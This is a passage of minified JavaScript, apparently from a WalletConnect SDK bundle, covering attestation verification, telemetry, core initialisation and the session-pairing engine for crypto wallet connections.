t?wRe(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Ti=(t,e,n)=>vRe(t,typeof e!="symbol"?e+"":e,n);class ERe extends Jwe{constructor(e,n,r){super(e,n,r),this.core=e,this.logger=n,this.store=r,Ti(this,"name",Exe),Ti(this,"abortController"),Ti(this,"isDevEnv"),Ti(this,"verifyUrlV3",Axe),Ti(this,"storagePrefix",Yl),Ti(this,"version",Uoe),Ti(this,"publicKey"),Ti(this,"fetchPromise"),Ti(this,"init",async()=>{var i;this.isDevEnv||(this.publicKey=await this.store.getItem(this.storeKey),this.publicKey&&Ye.toMiliseconds((i=this.publicKey)==null?void 0:i.expiresAt)<Date.now()&&(this.logger.debug("verify v2 public key expired"),await this.removePublicKey()))}),Ti(this,"register",async i=>{if(!iw()||this.isDevEnv)return;const s=window.location.origin,{id:o,decryptedId:a}=i,c=`${this.verifyUrlV3}/attestation?projectId=${this.core.projectId}&origin=${s}&id=${o}&decryptedId=${a}`;try{const l=Pf.getDocument(),f=this.startAbortTimer(Ye.ONE_SECOND*5),h=await new Promise((m,b)=>{const w=()=>{window.removeEventListener("message",E),l.body.removeChild(y),b("attestation aborted")};this.abortController.signal.addEventListener("abort",w);const y=l.createElement("iframe");y.src=c,y.style.display="none",y.addEventListener("error",w,{signal:this.abortController.signal});const E=A=>{if(A.data&&typeof A.data=="string")try{const R=JSON.parse(A.data);if(R.type==="verify_attestation"){if(Zk(R.attestation).payload.id!==o)return;clearInterval(f),l.body.removeChild(y),this.abortController.signal.removeEventListener("abort",w),window.removeEventListener("message",E),m(R.attestation===null?"":R.attestation)}}catch(R){this.logger.warn(R)}};l.body.appendChild(y),window.addEventListener("message",E,{signal:this.abortController.signal})});return this.logger.debug(h,"jwt attestation"),h}catch(l){this.logger.warn(l)}return""}),Ti(this,"resolve",async i=>{if(this.isDevEnv)return"";const{attestationId:s,hash:o,encryptedId:a}=i;if(s===""){this.logger.debug("resolve: attestationId is empty, skipping");return}if(s){if(Zk(s).payload.id!==a)return;const l=await this.isValidJwtAttestation(s);if(l){if(!l.isVerified){this.logger.warn("resolve: jwt attestation: origin url not verified");return}return l}}if(!o)return;const c=this.getVerifyUrl(i?.verifyUrl);return this.fetchAttestation(o,c)}),Ti(this,"fetchAttestation",async(i,s)=>{this.logger.debug(`resolving attestation: ${i} from url: ${s}`);const o=this.startAbortTimer(Ye.ONE_SECOND*5),a=await fetch(`${s}/attestation/${i}?v2Supported=true`,{signal:this.abortController.signal});return clearTimeout(o),a.status===200?await a.json():void 0}),Ti(this,"getVerifyUrl",i=>{let s=i||cE;return Cxe.includes(s)||(this.logger.info(`verify url: ${s}, not included in trusted list, assigning default: ${cE}`),s=cE),s}),Ti(this,"fetchPublicKey",async()=>{try{this.logger.debug(`fetching public key from: ${this.verifyUrlV3}`);const i=this.startAbortTimer(Ye.FIVE_SECONDS),s=await fetch(`${this.verifyUrlV3}/public-key`,{signal:this.abortController.signal});return clearTimeout(i),await s.json()}catch(i){this.logger.warn(i)}}),Ti(this,"persistPublicKey",async i=>{this.logger.debug(i,"persisting public key to local storage"),await this.store.setItem(this.storeKey,i),this.publicKey=i}),Ti(this,"removePublicKey",async()=>{this.logger.debug("removing verify v2 public key from storage"),await this.store.removeItem(this.storeKey),this.publicKey=void 0}),Ti(this,"isValidJwtAttestation",async i=>{const s=await this.getPublicKey();try{if(s)return this.validateAttestation(i,s)}catch(a){this.logger.error(a),this.logger.warn("error validating attestation")}const o=await this.fetchAndPersistPublicKey();try{if(o)return this.validateAttestation(i,o)}catch(a){this.logger.error(a),this.logger.warn("error validating attestation")}}),Ti(this,"getPublicKey",async()=>this.publicKey?this.publicKey:await this.fetchAndPersistPublicKey()),Ti(this,"fetchAndPersistPublicKey",async()=>{if(this.fetchPromise)return await this.fetchPromise,this.publicKey;this.fetchPromise=new Promise(async s=>{const o=await this.fetchPublicKey();o&&(await this.persistPublicKey(o),s(o))});const i=await this.fetchPromise;return this.fetchPromise=void 0,i}),Ti(this,"validateAttestation",(i,s)=>{const o=y4e(i,s.publicKey),a={hasExpired:Ye.toMiliseconds(o.exp)<Date.now(),payload:o};if(a.hasExpired)throw this.logger.warn("resolve: jwt attestation expired"),new Error("JWT attestation expired");return{origin:a.payload.origin,isScam:a.payload.isScam,isVerified:a.payload.isVerified}}),this.logger=aa(n,this.name),this.abortController=new AbortController,this.isDevEnv=CB(),this.init()}get storeKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//verify:public:key"}get context(){return oa(this.logger)}startAbortTimer(e){return this.abortController=new AbortController,setTimeout(()=>this.abortController.abort(),Ye.toMiliseconds(e))}}var _Re=Object.defineProperty,ARe=(t,e,n)=>e in t?_Re(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,lV=(t,e,n)=>ARe(t,typeof e!="symbol"?e+"":e,n);class CRe extends Xwe{constructor(e,n){super(e,n),this.projectId=e,this.logger=n,lV(this,"context",Sxe),lV(this,"registerDeviceToken",async r=>{const{clientId:i,token:s,notificationType:o,enableEncrypted:a=!1}=r,c=`${Txe}/${this.projectId}/clients`;await fetch(c,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({client_id:i,type:o,token:s,always_raw:a})})}),this.logger=aa(n,this.context)}}var SRe=Object.defineProperty,dV=Object.getOwnPropertySymbols,TRe=Object.prototype.hasOwnProperty,xRe=Object.prototype.propertyIsEnumerable,I7=(t,e,n)=>e in t?SRe(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Ov=(t,e)=>{for(var n in e||(e={}))TRe.call(e,n)&&I7(t,n,e[n]);if(dV)for(var n of dV(e))xRe.call(e,n)&&I7(t,n,e[n]);return t},Ki=(t,e,n)=>I7(t,typeof e!="symbol"?e+"":e,n);class IRe extends eve{constructor(e,n,r=!0){super(e,n,r),this.core=e,this.logger=n,Ki(this,"context",Ixe),Ki(this,"storagePrefix",Yl),Ki(this,"storageVersion",xxe),Ki(this,"events",new Map),Ki(this,"shouldPersist",!1),Ki(this,"init",async()=>{if(!CB())try{const i={eventId:Vz(),timestamp:Date.now(),domain:this.getAppDomain(),props:{event:"INIT",type:"",properties:{client_id:await this.core.crypto.getClientId(),user_agent:Ise(this.core.relayer.protocol,this.core.relayer.version,v7)}}};await this.sendEvent([i])}catch(i){this.logger.warn(i)}}),Ki(this,"createEvent",i=>{const{event:s="ERROR",type:o="",properties:{topic:a,trace:c}}=i,l=Vz(),f=this.core.projectId||"",h=Date.now(),m=Ov({eventId:l,timestamp:h,props:{event:s,type:o,properties:{topic:a,trace:c}},bundleId:f,domain:this.getAppDomain()},this.setMethods(l));return this.telemetryEnabled&&(this.events.set(l,m),this.shouldPersist=!0),m}),Ki(this,"getEvent",i=>{const{eventId:s,topic:o}=i;if(s)return this.events.get(s);const a=Array.from(this.events.values()).find(c=>c.props.properties.topic===o);if(a)return Ov(Ov({},a),this.setMethods(a.eventId))}),Ki(this,"deleteEvent",i=>{const{eventId:s}=i;this.events.delete(s),this.shouldPersist=!0}),Ki(this,"setEventListeners",()=>{this.core.heartbeat.on(Fg.pulse,async()=>{this.shouldPersist&&await this.persist(),this.events.forEach(i=>{Ye.fromMiliseconds(Date.now())-Ye.fromMiliseconds(i.timestamp)>Rxe&&(this.events.delete(i.eventId),this.shouldPersist=!0)})})}),Ki(this,"setMethods",i=>({addTrace:s=>this.addTrace(i,s),setError:s=>this.setError(i,s)})),Ki(this,"addTrace",(i,s)=>{const o=this.events.get(i);o&&(o.props.properties.trace.push(s),this.events.set(i,o),this.shouldPersist=!0)}),Ki(this,"setError",(i,s)=>{const o=this.events.get(i);o&&(o.props.type=s,o.timestamp=Date.now(),this.events.set(i,o),this.shouldPersist=!0)}),Ki(this,"persist",async()=>{await this.core.storage.setItem(this.storageKey,Array.from(this.events.values())),this.shouldPersist=!1}),Ki(this,"restore",async()=>{try{const i=await this.core.storage.getItem(this.storageKey)||[];if(!i.length)return;i.forEach(s=>{this.events.set(s.eventId,Ov(Ov({},s),this.setMethods(s.eventId)))})}catch(i){this.logger.warn(i)}}),Ki(this,"submit",async()=>{if(!this.telemetryEnabled||this.events.size===0)return;const i=[];for(const[s,o]of this.events)o.props.type&&i.push(o);if(i.length!==0)try{if((await this.sendEvent(i)).ok)for(const s of i)this.events.delete(s.eventId),this.shouldPersist=!0}catch(s){this.logger.warn(s)}}),Ki(this,"sendEvent",async i=>{const s=this.getAppDomain()?"":"&sp=desktop";return await fetch(`${Pxe}?projectId=${this.core.projectId}&st=events_sdk&sv=js-${v7}${s}`,{method:"POST",body:JSON.stringify(i)})}),Ki(this,"getAppDomain",()=>xse().url),this.logger=aa(n,this.context),this.telemetryEnabled=r,r?this.restore().then(async()=>{await this.submit(),this.setEventListeners()}):this.persist()}get storageKey(){return this.storagePrefix+this.storageVersion+this.core.customStoragePrefix+"//"+this.context}}var RRe=Object.defineProperty,fV=Object.getOwnPropertySymbols,PRe=Object.prototype.hasOwnProperty,NRe=Object.prototype.propertyIsEnumerable,R7=(t,e,n)=>e in t?RRe(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,hV=(t,e)=>{for(var n in e||(e={}))PRe.call(e,n)&&R7(t,n,e[n]);if(fV)for(var n of fV(e))NRe.call(e,n)&&R7(t,n,e[n]);return t},vr=(t,e,n)=>R7(t,typeof e!="symbol"?e+"":e,n);let ORe=class Xoe extends $we{constructor(e){var n;super(e),vr(this,"protocol",Moe),vr(this,"version",Uoe),vr(this,"name",w7),vr(this,"relayUrl"),vr(this,"projectId"),vr(this,"customStoragePrefix"),vr(this,"events",new Wc.EventEmitter),vr(this,"logger"),vr(this,"heartbeat"),vr(this,"relayer"),vr(this,"crypto"),vr(this,"storage"),vr(this,"history"),vr(this,"expirer"),vr(this,"pairing"),vr(this,"verify"),vr(this,"echoClient"),vr(this,"linkModeSupportedApps"),vr(this,"eventClient"),vr(this,"initialized",!1),vr(this,"logChunkController"),vr(this,"on",(a,c)=>this.events.on(a,c)),vr(this,"once",(a,c)=>this.events.once(a,c)),vr(this,"off",(a,c)=>this.events.off(a,c)),vr(this,"removeListener",(a,c)=>this.events.removeListener(a,c)),vr(this,"dispatchEnvelope",({topic:a,message:c,sessionExists:l})=>{if(!a||!c)return;const f={topic:a,message:c,publishedAt:Date.now(),transportType:Or.link_mode};this.relayer.onLinkMessageEvent(f,{sessionExists:l})});const r=this.getGlobalCore(e?.customStoragePrefix);if(r)try{return this.customStoragePrefix=r.customStoragePrefix,this.logger=r.logger,this.heartbeat=r.heartbeat,this.crypto=r.crypto,this.history=r.history,this.expirer=r.expirer,this.storage=r.storage,this.relayer=r.relayer,this.pairing=r.pairing,this.verify=r.verify,this.echoClient=r.echoClient,this.linkModeSupportedApps=r.linkModeSupportedApps,this.eventClient=r.eventClient,this.initialized=r.initialized,this.logChunkController=r.logChunkController,r}catch(a){console.warn("Failed to copy global core",a)}this.projectId=e?.projectId,this.relayUrl=e?.relayUrl||Foe,this.customStoragePrefix=e!=null&&e.customStoragePrefix?`:${e.customStoragePrefix}`:"";const i=eB({level:typeof e?.logger=="string"&&e.logger?e.logger:QTe.logger,name:w7}),{logger:s,chunkLoggerController:o}=$I({opts:i,maxSizeInBytes:e?.maxLogBlobSizeInBytes,loggerOverride:e?.logger});this.logChunkController=o,(n=this.logChunkController)!=null&&n.downloadLogsBlobInBrowser&&(window.downloadLogsBlobInBrowser=async()=>{var a,c;(a=this.logChunkController)!=null&&a.downloadLogsBlobInBrowser&&((c=this.logChunkController)==null||c.downloadLogsBlobInBrowser({clientId:await this.crypto.getClientId()}))}),this.logger=aa(s,this.name),this.heartbeat=new iwe,this.crypto=new s8e(this,this.logger,e?.keychain),this.history=new mRe(this,this.logger),this.expirer=new bRe(this,this.logger),this.storage=e!=null&&e.storage?e.storage:new Uwe(hV(hV({},JTe),e?.storageOptions)),this.relayer=new O8e({core:this,logger:this.logger,relayUrl:this.relayUrl,projectId:this.projectId}),this.pairing=new fRe(this,this.logger),this.verify=new ERe(this,this.logger,this.storage),this.echoClient=new CRe(this.projectId||"",this.logger),this.linkModeSupportedApps=[],this.eventClient=new IRe(this,this.logger,e?.telemetryEnabled),this.setGlobalCore(this)}static async init(e){const n=new Xoe(e);await n.initialize();const r=await n.crypto.getClientId();return await n.storage.setItem(fxe,r),n}get context(){return oa(this.logger)}async start(){this.initialized||await this.initialize()}async getLogsBlob(){var e;return(e=this.logChunkController)==null?void 0:e.logsToBlob({clientId:await this.crypto.getClientId()})}async addLinkModeSupportedApp(e){this.linkModeSupportedApps.includes(e)||(this.linkModeSupportedApps.push(e),await this.storage.setItem(Vq,this.linkModeSupportedApps))}async initialize(){this.logger.trace("Initialized");try{await this.crypto.init(),await this.history.init(),await this.expirer.init(),await this.relayer.init(),await this.heartbeat.init(),await this.pairing.init(),this.linkModeSupportedApps=await this.storage.getItem(Vq)||[],this.initialized=!0,this.logger.info("Core Initialization Success")}catch(e){throw this.logger.warn(e,`Core Initialization Failure at epoch ${Date.now()}`),this.logger.error(e.message),e}}getGlobalCore(e=""){try{if(this.isGlobalCoreDisabled())return;const n=`_walletConnectCore_${e}`,r=`${n}_count`;return globalThis[r]=(globalThis[r]||0)+1,globalThis[r]>1&&console.warn(`WalletConnect Core is already initialized. This is probably a mistake and can lead to unexpected behavior. Init() was called ${globalThis[r]} times.`),globalThis[n]}catch(n){console.warn("Failed to get global WalletConnect core",n);return}}setGlobalCore(e){var n;try{if(this.isGlobalCoreDisabled())return;const r=`_walletConnectCore_${((n=e.opts)==null?void 0:n.customStoragePrefix)||""}`;globalThis[r]=e}catch(r){console.warn("Failed to set global WalletConnect core",r)}}isGlobalCoreDisabled(){try{return typeof process<"u"&&YTe.DISABLE_GLOBAL_CORE==="true"}catch{return!0}}};const kRe=ORe,eae="wc",tae=2,nae="client",LB=`${eae}@${tae}:${nae}:`,O9={name:nae,logger:"error"},pV="WALLETCONNECT_DEEPLINK_CHOICE",DRe="proposal",mV="Proposal expired",BRe="session",cb=Ye.SEVEN_DAYS,jRe="engine",bs={wc_sessionPropose:{req:{ttl:Ye.FIVE_MINUTES,prompt:!0,tag:1100},res:{ttl:Ye.FIVE_MINUTES,prompt:!1,tag:1101},reject:{ttl:Ye.FIVE_MINUTES,prompt:!1,tag:1120},autoReject:{ttl:Ye.FIVE_MINUTES,prompt:!1,tag:1121}},wc_sessionSettle:{req:{ttl:Ye.FIVE_MINUTES,prompt:!1,tag:1102},res:{ttl:Ye.FIVE_MINUTES,prompt:!1,tag:1103}},wc_sessionUpdate:{req:{ttl:Ye.ONE_DAY,prompt:!1,tag:1104},res:{ttl:Ye.ONE_DAY,prompt:!1,tag:1105}},wc_sessionExtend:{req:{ttl:Ye.ONE_DAY,prompt:!1,tag:1106},res:{ttl:Ye.ONE_DAY,prompt:!1,tag:1107}},wc_sessionRequest:{req:{ttl:Ye.FIVE_MINUTES,prompt:!0,tag:1108},res:{ttl:Ye.FIVE_MINUTES,prompt:!1,tag:1109}},wc_sessionEvent:{req:{ttl:Ye.FIVE_MINUTES,prompt:!0,tag:1110},res:{ttl:Ye.FIVE_MINUTES,prompt:!1,tag:1111}},wc_sessionDelete:{req:{ttl:Ye.ONE_DAY,prompt:!1,tag:1112},res:{ttl:Ye.ONE_DAY,prompt:!1,tag:1113}},wc_sessionPing:{req:{ttl:Ye.ONE_DAY,prompt:!1,tag:1114},res:{ttl:Ye.ONE_DAY,prompt:!1,tag:1115}},wc_sessionAuthenticate:{req:{ttl:Ye.ONE_HOUR,prompt:!0,tag:1116},res:{ttl:Ye.ONE_HOUR,prompt:!1,tag:1117},reject:{ttl:Ye.FIVE_MINUTES,prompt:!1,tag:1118},autoReject:{ttl:Ye.FIVE_MINUTES,prompt:!1,tag:1119}}},k9={min:Ye.FIVE_MINUTES,max:Ye.SEVEN_DAYS},_l={idle:"IDLE",active:"ACTIVE"},MRe={eth_sendTransaction:{key:""},eth_sendRawTransaction:{key:""},wallet_sendCalls:{key:""},solana_signTransaction:{key:"signature"},solana_signAllTransactions:{key:"transactions"},solana_signAndSendTransaction:{key:"signature"},sui_signAndExecuteTransaction:{key:"digest"},sui_signTransaction:{key:""},hedera_signAndExecuteTransaction:{key:"transactionId"},hedera_executeTransaction:{key:"transactionId"},near_signTransaction:{key:""},near_signTransactions:{key:""},tron_signTransaction:{key:"txID"},xrpl_signTransaction:{key:""},xrpl_signTransactionFor:{key:""},algo_signTxn:{key:""},sendTransfer:{key:"txid"},stacks_stxTransfer:{key:"txId"},polkadot_signTransaction:{key:""},cosmos_signDirect:{key:""}},URe="request",LRe=["wc_sessionPropose","wc_sessionRequest","wc_authRequest","wc_sessionAuthenticate"],FRe="wc",$Re="auth",HRe="authKeys",zRe="pairingTopics",qRe="requests",c8=`${FRe}@${1.5}:${$Re}:`,KT=`${c8}:PUB_KEY`;var VRe=Object.defineProperty,WRe=Object.defineProperties,GRe=Object.getOwnPropertyDescriptors,gV=Object.getOwnPropertySymbols,KRe=Object.prototype.hasOwnProperty,ZRe=Object.prototype.propertyIsEnumerable,P7=(t,e,n)=>e in t?VRe(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,zn=(t,e)=>{for(var n in e||(e={}))KRe.call(e,n)&&P7(t,n,e[n]);if(gV)for(var n of gV(e))ZRe.call(e,n)&&P7(t,n,e[n]);return t},ws=(t,e)=>WRe(t,GRe(e)),We=(t,e,n)=>P7(t,typeof e!="symbol"?e+"":e,n);class YRe extends ive{constructor(e){super(e),We(this,"name",jRe),We(this,"events",new oB),We(this,"initialized",!1),We(this,"requestQueue",{state:_l.idle,queue:[]}),We(this,"sessionRequestQueue",{state:_l.idle,queue:[]}),We(this,"emittedSessionRequests",new P6e({limit:500})),We(this,"requestQueueDelay",Ye.ONE_SECOND),We(this,"expectedPairingMethodMap",new Map),We(this,"recentlyDeletedMap",new Map),We(this,"recentlyDeletedLimit",200),We(this,"relayMessageCache",[]),We(this,"pendingSessions",new Map),We(this,"init",async()=>{this.initialized||(await this.cleanup(),this.registerRelayerEvents(),this.registerExpirerEvents(),this.registerPairingEvents(),await this.registerLinkModeListeners(),this.client.core.pairing.register({methods:Object.keys(bs)}),this.initialized=!0,setTimeout(async()=>{await this.processPendingMessageEvents(),this.sessionRequestQueue.queue=this.getPendingSessionRequests(),this.processSessionRequestQueue()},Ye.toMiliseconds(this.requestQueueDelay)))}),We(this,"connect",async n=>{var r;this.isInitialized(),await this.confirmOnlineStateOrThrow();const i=ws(zn({},n),{requiredNamespaces:n.requiredNamespaces||{},optionalNamespaces:n.optionalNamespaces||{}});await this.isValidConnect(i),i.optionalNamespaces=F4e(i.requiredNamespaces,i.optionalNamespaces),i.requiredNamespaces={};const{pairingTopic:s,requiredNamespaces:o,optionalNamespaces:a,sessionProperties:c,scopedProperties:l,relays:f,authentication:h,walletPay:m}=i,b=((r=h?.[0])==null?void 0:r.ttl)||bs.wc_sessionPropose.req.ttl||Ye.FIVE_MINUTES;this.validateRequestExpiry(b);let w=s,y,E=!1;try{if(w){const T=this.client.core.pairing.pairings.get(w);this.client.logger.warn("connect() with existing pairing topic is deprecated and will be removed in the next major release."),E=T.active}}catch(T){throw this.client.logger.error(`connect() -> pairing.get(${w}) failed`),T}if(!w||!E){const{topic:T,uri:B}=await this.client.core.pairing.create({internal:{skipSubscribe:!0}});w=T,y=B}if(!w){const{message:T}=Xe("NO_MATCHING_KEY",`connect() pairing topic: ${w}`);throw new Error(T)}const A=await this.client.core.crypto.generateKeyPair(),R=Ii(b),S=zn(ws(zn(zn({requiredNamespaces:o,optionalNamespaces:a,relays:f??[{protocol:Loe}],proposer:{publicKey:A,metadata:this.client.metadata},expiryTimestamp:R,pairingTopic:w},c&&{sessionProperties:c}),l&&{scopedProperties:l}),{id:Il()}),(h||m)&&{requests:{authentication:h?.map(T=>{const{domain:B,chains:U,nonce:M,uri:N,exp:q,nbf:P,type:C,statement:j,requestId:z,resources:$,signatureTypes:H}=T;return{domain:B,chains:U,nonce:M,type:C??"caip122",aud:N,version:"1",iat:new Date().toISOString(),exp:q,nbf:P,statement:j,requestId:z,resources:$,signatureTypes:H}}),walletPay:m}}),v=Jn("session_connect",S.id),{reject:k,resolve:O,done:_}=Am(b,mV),I=({id:T})=>{T===S.id&&(this.client.events.off("proposal_expire",I),this.pendingSessions.delete(S.id),this.events.emit(v,{error:{message:mV,code:0}}))};return this.client.events.on("proposal_expire",I),this.events.once(v,({error:T,session:B})=>{this.client.events.off("proposal_expire",I),T?k(T):B&&O(B)}),await this.setProposal(S.id,S),await this.sendProposeSession({proposal:S,publishOpts:{internal:{throwOnFailedPublish:!0},tvf:{correlationId:S.id}}}).catch(T=>{throw this.deleteProposal(S.id),T}),{uri:y,approval:_}}),We(this,"pair",async n=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{return await this.client.core.pairing.pair(n)}catch(r){throw this.client.logger.error("pair() failed"),r}}),We(this,"approve",async n=>{var r,i,s;const o=this.client.core.eventClient.createEvent({properties:{topic:(r=n?.id)==null?void 0:r.toString(),trace:[hu.session_approve_started]}});try{this.isInitialized(),await this.confirmOnlineStateOrThrow()}catch(B){throw o.setError(K0.no_internet_connection),B}try{await this.isValidProposalId(n?.id)}catch(B){throw this.client.logger.error(`approve() -> proposal.get(${n?.id}) failed`),o.setError(K0.proposal_not_found),B}try{await this.isValidApprove(n)}catch(B){throw this.client.logger.error("approve() -> isValidApprove() failed"),o.setError(K0.session_approve_namespace_validation_failure),B}const{id:a,relayProtocol:c,namespaces:l,sessionProperties:f,scopedProperties:h,sessionConfig:m,proposalRequestsResponses:b}=n,w=this.client.proposal.get(a);this.client.core.eventClient.deleteEvent({eventId:o.eventId});const{pairingTopic:y,proposer:E,requiredNamespaces:A,optionalNamespaces:R}=w;let S=(i=this.client.core.eventClient)==null?void 0:i.getEvent({topic:y});S||(S=(s=this.client.core.eventClient)==null?void 0:s.createEvent({type:hu.session_approve_started,properties:{topic:y,trace:[hu.session_approve_started,hu.session_namespaces_validation_success]}}));const v=await this.client.core.crypto.generateKeyPair(),k=E.publicKey,O=await this.client.core.crypto.generateSharedKey(v,k),_=ws(zn(zn(zn({relay:{protocol:c??"irn"},namespaces:l,controller:{publicKey:v,metadata:this.client.metadata},expiry:Ii(cb)},f&&{sessionProperties:f}),h&&{scopedProperties:h}),m&&{sessionConfig:m}),{proposalRequestsResponses:b}),I=Or.relay;S.addTrace(hu.subscribing_session_topic);try{await this.client.core.relayer.subscribe(O,{transportType:I,internal:{skipSubscribe:!0}})}catch(B){throw S.setError(K0.subscribe_session_topic_failure),B}S.addTrace(hu.subscribe_session_topic_success);const T=ws(zn({},_),{topic:O,requiredNamespaces:A,optionalNamespaces:R,pairingTopic:y,acknowledged:!1,self:_.controller,peer:{publicKey:E.publicKey,metadata:E.metadata},controller:v,transportType:Or.relay,authentication:b?.authentication,walletPayResult:b?.walletPay});await this.client.session.set(O,T),S.addTrace(hu.store_session);try{await this.sendApproveSession({sessionTopic:O,proposal:w,pairingProposalResponse:{relay:{protocol:c??"irn"},responderPublicKey:v},sessionSettleRequest:_,publishOpts:{internal:{throwOnFailedPublish:!0},tvf:zn({correlationId:a},this.getTVFApproveParams(T))}}),S.addTrace(hu.session_approve_publish_success)}catch(B){throw this.client.logger.error(B),this.client.session.delete(O,Ur("USER_DISCONNECTED")),await this.client.core.relayer.unsubscribe(O),B}return this.client.core.eventClient.deleteEvent({eventId:S.eventId}),await this.client.core.pairing.updateMetadata({topic:y,metadata:E.metadata}),await this.deleteProposal(a),await this.client.core.pairing.activate({topic:y}),await this.setExpiry(O,Ii(cb)),{topic:O,acknowledged:()=>Promise.resolve(this.client.session.get(O))}}),We(this,"reject",async n=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidReject(n)}catch(o){throw this.client.logger.error("reject() -> isValidReject() failed"),o}const{id:r,reason:i}=n;let s;try{s=this.client.proposal.get(r).pairingTopic}catch(o){throw this.client.logger.error(`reject() -> proposal.get(${r}) failed`),o}s&&await this.sendError({id:r,topic:s,error:i,rpcOpts:bs.wc_sessionPropose.reject}),await this.deleteProposal(r)}),We(this,"update",async n=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidUpdate(n)}catch(h){throw this.client.logger.error("update() -> isValidUpdate() failed"),h}const{topic:r,namespaces:i}=n,{done:s,resolve:o,reject:a}=Am(Ye.FIVE_MINUTES,"Session update request expired without receiving any acknowledgement"),c=Il(),l=mp().toString(),f=this.client.session.get(r).namespaces;return this.events.once(Jn("session_update",c),({error:h})=>{h?a(h):o()}),await this.client.session.update(r,{namespaces:i}),await this.sendRequest({topic:r,method:"wc_sessionUpdate",params:{namespaces:i},throwOnFailedPublish:!0,clientRpcId:c,relayRpcId:l}).catch(h=>{this.client.logger.error(h),this.client.session.update(r,{namespaces:f}),a(h)}),{acknowledged:s}}),We(this,"extend",async n=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidExtend(n)}catch(c){throw this.client.logger.error("extend() -> isValidExtend() failed"),c}const{topic:r}=n,i=Il(),{done:s,resolve:o,reject:a}=Am(Ye.FIVE_MINUTES,"Session extend request expired without receiving any acknowledgement");return this.events.once(Jn("session_extend",i),({error:c})=>{c?a(c):o()}),await this.setExpiry(r,Ii(cb)),this.sendRequest({topic:r,method:"wc_sessionExtend",params:{},clientRpcId:i,throwOnFailedPublish:!0}).catch(c=>{a(c)}),{acknowledged:s}}),We(this,"request",async n=>{this.isInitialized();try{await this.isValidRequest(n)}catch(E){throw this.client.logger.error("request() -> isValidRequest() failed"),E}const{chainId:r,request:i,topic:s,expiry:o=bs.wc_sessionRequest.req.ttl}=n,a=this.client.session.get(s);a?.transportType===Or.relay&&await this.confirmOnlineStateOrThrow();const c=Il(),l=mp().toString(),{done:f,resolve:h,reject:m}=Am(o,"Request expired. Please try again.");this.events.once(Jn("session_request",c),({error:E,result:A})=>{E?m(E):h(A)});const b="wc_sessionRequest",w=this.getAppLinkIfEnabled(a.peer.metadata,a.transportType);if(w)return await this.sendRequest({clientRpcId:c,relayRpcId:l,topic:s,method:b,params:{request:ws(zn({},i),{expiryTimestamp:Ii(o)}),chainId:r},expiry:o,throwOnFailedPublish:!0,appLink:w}).catch(E=>m(E)),this.client.events.emit("session_request_sent",{topic:s,request:i,chainId:r,id:c}),await f();const y={request:ws(zn({},i),{expiryTimestamp:Ii(o)}),chainId:r};return await Promise.all([new Promise(async E=>{await this.sendRequest({clientRpcId:c,relayRpcId:l,topic:s,method:b,params:y,expiry:o,throwOnFailedPublish:!0,tvf:this.getTVFParams(c,y)}).catch(A=>m(A)),this.client.events.emit("session_request_sent",{topic:s,request:i,chainId:r,id:c}),E()}),new Promise(async E=>{var A;if(!((A=a.sessionConfig)!=null&&A.disableDeepLink)){const R=await S6e(this.client.core.storage,pV);await _6e({id:c,topic:s,wcDeepLink:R})}E()}),f()]).then(E=>E[2])}),We(this,"respond",async n=>{var r,i;this.isInitialized();const s=this.client.core.eventClient.createEvent({properties:{topic:n?.topic||((i=(r=n?.response)==null?void 0:r.id)==null?void 0:i.toString()),trace:[hu.session_request_response_started]}});try{await this.isValidRespond(n)}catch(h){throw s.addTrace(h?.message),s.setError(K0.session_request_response_validation_failure),h}s.addTrace(hu.session_request_response_validation_success);const{topic:o,response:a}=n,{id:c}=a,l=this.client.session.get(o);l.transportType===Or.relay&&await this.confirmOnlineStateOrThrow();const f=this.getAppLinkIfEnabled(l.peer.metadata,l.transportType);try{s.addTrace(hu.session_request_response_publish_started),Rl(a)?await this.sendResult({id:c,topic:o,result:a.result,throwOnFailedPublish:!0,appLink:f}):Nc(a)&&await this.sendError({id:c,topic:o,error:a.error,appLink:f}),this.cleanupAfterResponse(n)}catch(h){throw s.addTrace(h?.message),s.setError(K0.session_request_response_publish_failure),h}}),We(this,"ping",async n=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidPing(n)}catch(i){throw this.client.logger.error("ping() -> isValidPing() failed"),i}const{topic:r}=n;if(this.client.session.keys.includes(r)){const i=Il(),s=mp().toString(),{done:o,resolve:a,reject:c}=Am(Ye.FIVE_MINUTES,"Ping request expired without receiving any acknowledgement");this.events.once(Jn("session_ping",i),({error:l})=>{l?c(l):a()}),await Promise.all([this.sendRequest({topic:r,method:"wc_sessionPing",params:{},throwOnFailedPublish:!0,clientRpcId:i,relayRpcId:s}),o()])}else this.client.core.pairing.pairings.keys.includes(r)&&(this.client.logger.warn("ping() on pairing topic is deprecated and will be removed in the next major release."),await this.client.core.pairing.ping({topic:r}))}),We(this,"emit",async n=>{this.isInitialized(),await this.confirmOnlineStateOrThrow(),await this.isValidEmit(n);const{topic:r,event:i,chainId:s}=n,o=mp().toString(),a=Il();await this.sendRequest({topic:r,method:"wc_sessionEvent",params:{event:i,chainId:s},throwOnFailedPublish:!0,relayRpcId:o,clientRpcId:a})}),We(this,"disconnect",async n=>{this.isInitialized(),await this.confirmOnlineStateOrThrow(),await this.isValidDisconnect(n);const{topic:r}=n;if(this.client.session.keys.includes(r))await this.sendRequest({topic:r,method:"wc_sessionDelete",params:Ur("USER_DISCONNECTED"),throwOnFailedPublish:!0}),await this.deleteSession({topic:r,emitEvent:!1});else if(this.client.core.pairing.pairings.keys.includes(r))await this.client.core.pairing.disconnect({topic:r});else{const{message:i}=Xe("MISMATCHED_TOPIC",`Session or pairing topic not found: ${r}`);throw new Error(i)}}),We(this,"find",n=>(this.isInitialized(),this.client.session.getAll().filter(r=>z4e(r,n)))),We(this,"getPendingSessionRequests",()=>this.client.pendingRequest.getAll()),We(this,"authenticate",async(n,r)=>{var i;this.isInitialized(),this.isValidAuthenticate(n);const 